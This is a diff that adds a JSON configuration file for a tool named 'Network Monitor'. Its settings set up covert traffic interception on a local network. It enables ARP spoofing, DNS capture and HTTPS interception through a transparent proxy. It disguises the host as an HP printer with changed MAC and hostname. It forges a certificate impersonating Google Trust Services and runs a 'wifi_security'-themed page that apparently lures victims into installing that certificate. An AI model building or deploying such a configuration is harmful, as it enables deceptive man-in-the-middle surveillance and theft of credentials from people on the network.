@@ -1,0 +1,79 @@
+{
+  "app": {
+    "name": "Network Monitor",
+    "version": "1.0.0",
+    "run_on_startup": false,
+    "minimize_to_tray": true,
+    "check_for_updates": false
+  },
+  "network": {
+    "interface": "auto",
+    "gateway_ip": "auto",
+    "subnet_mask": "auto",
+    "monitor_own_traffic": false
+  },
+  "stealth": {
+    "enabled": true,
+    "device_profile": "hp_printer",
+    "change_mac": true,
+    "change_hostname": true,
+    "randomize_on_start": false
+  },
+  "capture": {
+    "dns_capture": true,
+    "https_interception": true,
+    "arp_spoofing": true,
+    "max_packet_size": 65535,
+    "buffer_size": 104857600
+  },
+  "proxy": {
+    "listen_port": 8080,
+    "transparent_mode": true,
+    "ssl_insecure": false,
+    "connection_timeout": 30,
+    "max_connections": 1000
+  },
+  "certificate": {
+    "profile": "google_trust",
+    "organization": "Google Trust Services",
+    "validity_days": 365,
+    "key_size": 2048,
+    "auto_regenerate": false
+  },
+  "cert_installer": {
+    "enabled": true,
+    "port": 8888,
+    "theme": "wifi_security",
+    "custom_domain": null,
+    "ssl_enabled": false
+  },
+  "database": {
+    "path": "./database/network_monitor.db",
+    "max_size_mb": 5000,
+    "retention_days": 90,
+    "vacuum_on_start": false,
+    "backup_enabled": true,
+    "backup_interval_hours": 24
+  },
+  "logging": {
+    "level": "INFO",
+    "file": "./logs/app.log",
+    "max_size_mb": 100,
+    "backup_count": 5,
+    "console_output": false
+  },
+  "ui": {
+    "theme": "dark",
+    "language": "en",
+    "refresh_interval_ms": 1000,
+    "max_table_rows": 1000,
+    "show_raw_data": false,
+    "default_view": "dashboard"
+  },
+  "privacy": {
+    "blur_passwords": true,
+    "hide_sensitive_data": true,
+    "local_only": true,
+    "no_telemetry": true
+  }
+}
